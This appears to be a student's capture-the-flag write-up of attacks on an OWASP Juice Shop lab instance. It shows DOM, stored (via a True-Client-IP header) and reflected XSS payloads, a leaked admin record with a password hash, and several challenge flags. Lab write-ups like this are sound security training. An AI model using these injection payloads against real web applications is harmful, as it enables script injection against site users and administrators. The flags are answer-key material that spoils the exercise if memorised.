# OWASP Juice Shop — Complete Technical Exploitation Report

---

## Executive Summary
This report documents the security assessment and vulnerability exploitation conducted on the **OWASP Juice Shop** web application instance (`10.48.128.214`). The testing covered various attack vectors, including Client-Side Script Injection (DOM, Stored, and Reflected Cross-Site Scripting), Sensitive Data Exposure via API endpoints, and Navigation/Routing Discovery.

---
## 1. Task 7 - Question #1: DOM-Based Cross-Site Scripting (XSS)
### Description
A Client-Side DOM XSS vulnerability was identified in the main search bar interface. The application processes user input from the search parameter directly into the Document Object Model (DOM) without proper sanitization or context-aware encoding.
### Exploitation Steps
1. Navigate to the main store search page:
   ```text
   [http://10.48.128.214/#/search](http://10.48.128.214/#/search)
   ```
2. Click the search icon in the top header menu.
3. Inject the following payload into the search input box:
  ```html
  <iframe src="javascript:alert(`xss`)">
  ```
4. Press Enter to trigger execution.
Artifacts & Evidence
- Observed Result: Browser alert box popping up with the text ```xss```.
- Challenge Flag: ```4a31a4fe0954199566e360a873802bf64d0d0a84```

## 2. Task 7 - Question #2: Persistent (Stored) XSS & Sensitive Data Exposure
### Description
The application logs incoming client IP addresses using HTTP request headers (```True-Client-IP```). Because the server fails to sanitize header values prior to storing them in the database and rendering them in the administrative UI, an attacker can store arbitrary JavaScript payloads that execute whenever an administrator views the access logs.

Exploitation Steps
1. Authenticate to the application as the administrative user (```admin@juice-sh.op```).
2. Launch Burp Suite Professional and set Intercept to ```ON```.
3. Perform an action that triggers IP logging (e.g., logging out or hitting ```/rest/saveLoginIp```).
4. Intercept the request and send it to Burp Repeater.
5. Append the malicious HTTP header to the request structure:
```html
GET /rest/saveLoginIp HTTP/1.1
Host: 10.48.128.214
Authorization: Bearer eyJ0eXAi...
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```
6. Forward/Send the HTTP request to commit the payload to the database.
7. Log back into the ```admin``` account and navigate to Account > Privacy & Security > Last Login IP (```/#/privacy-security/last-login-ip```) to trigger payload execution.

Additional Vulnerability Finding: API Information Disclosure
During HTTP proxy analysis of the /rest/saveLoginIp response (```200 OK```), the API was found to leak full administrative user database records:
- Bearer Token: Identified under the ```Authorization``` header (```Bearer eyJ0eXAi...```).
- Leaked User Record:
```json
{
  "id": 1,
  "username": "",
  "email": "admin@juice-sh.op",
  "password": "0192023a7bbd73250516f0b9df18b500",
  "role": "admin"
}
```
## 3. Task 7 - Question #3: Reflected Cross-Site Scripting (XSS)
### Description
A Reflected XSS vulnerability exists in the order tracking functionality. Parameter values passed via the URL query string (```id```) are directly reflected into the HTML response without adequate sanitization.
Exploitation Steps
1. Modify the address bar URL, replacing the default tracking ID (```5267-f73cd000abcc353```) with the payload:
```plaintext
[http://10.48.128.214/#/track-result?id=](http://10.48.128.214/#/track-result?id=)<iframe src="javascript:alert(`xss`)">
```
2. Execute the HTTP request in the browser.

Artifacts & Evidence
- Rendered Template Context: ```Bonus Points Earned: {{bonus}}```
- Challenge Flag: ```305021787d3e9cd9cebc057a021c2504550bb3b6```

## 4. Privacy Policy Challenge
### Description
Locate and view the application's official Privacy Policy page to verify basic navigation routing and policy accessibility.
Exploitation Steps
1. Click the Account menu in the top right corner.
2. Select Privacy & Security > Privacy Policy.
3. Access the endpoint route directly:
```plaintext
[http://10.48.128.214/#/privacy-security/privacy-policy](http://10.48.128.214/#/privacy-security/privacy-policy)
```
Artifacts & Evidence
- Challenge Flag: 13083493dec15380f7319596e5e2bc67437ce5c4

## 5. Administrative Basket State Inspection
### Description
An inspection of the active shopping cart state for ```admin@juice-sh.op``` at ```http://10.48.128.214/#/basket``` revealed the following itemized configuration:

| Item Name              | Quantity  | Unit Price |
|:--                     |:--        |:--         |
| Apple Juice (1000ml)   | 2         | 1.99¤      | 
| Orange Juice (1000ml)  | 3         | 2.99¤      |
| Eggfruit Juice (500ml) | 1         | 8.99¤      |

- Total Price: ```21.94¤```
- Bonus Points Earned: ```1```

## 6. Accessing the Score Board
### Description
Discover the hidden client-side route used to track overall application challenge completion and verify flag submissions.
Exploitation Steps
1. Navigate directly to the unlinked client-side route in the browser location bar:
```plaintext
[http://10.48.128.214/#/score-board](http://10.48.128.214/#/score-board)
```
2. The UI renders the progress dashboard, unlocking completion metrics.

Artifacts & Evidence
- Challenge Flag: ```2614339936e8282e2f820f023d4d998a1f95e02a```
